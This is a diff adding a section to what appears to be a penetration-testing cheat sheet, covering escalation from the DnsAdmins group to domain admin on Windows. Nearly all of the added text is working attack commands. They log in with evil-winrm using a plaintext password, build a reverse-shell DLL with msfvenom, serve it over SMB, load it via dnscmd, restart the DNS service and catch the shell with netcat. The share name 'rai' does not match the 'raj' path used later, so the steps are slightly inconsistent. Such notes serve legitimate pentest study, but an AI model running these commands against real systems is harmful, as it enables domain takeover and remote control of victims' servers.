@@ -699,6 +699,24 @@ evil-winrm -i 192.168.1.41 -u administrator -H "##Hash##"
 net user admin
 ```
 
+5. DnsAdmins to DomainAdmin
+- Detection: 'whoami /groups' -> see if DnsAdmins are in the groups
+- Exploitation: as member of the DnsAdmins group can run the DLL file with elevated privileges. To exploit that privilege, we need to craft a malicious DLL file, transfer the dll via SMB, stop and start DNS service.
+```
+#on kali
+evil-winrm -i 192.168.1.172 -u jeenali -p "Password@1"
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f dll > raj.dll
+smbserver.py -smb2support rai /root
+
+#on victim to download the dll and restart the DNS service
+dnscmd.exe /config /serverlevelplugindll \\192.168.1.5\raj\raj.dll
+sc stop dns
+sc start dns
+
+#on kali to catch reverse shell
+nc -nvlp 4444
+```
+
 # Linux Priv Esc
 - https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
 ## Enumeration
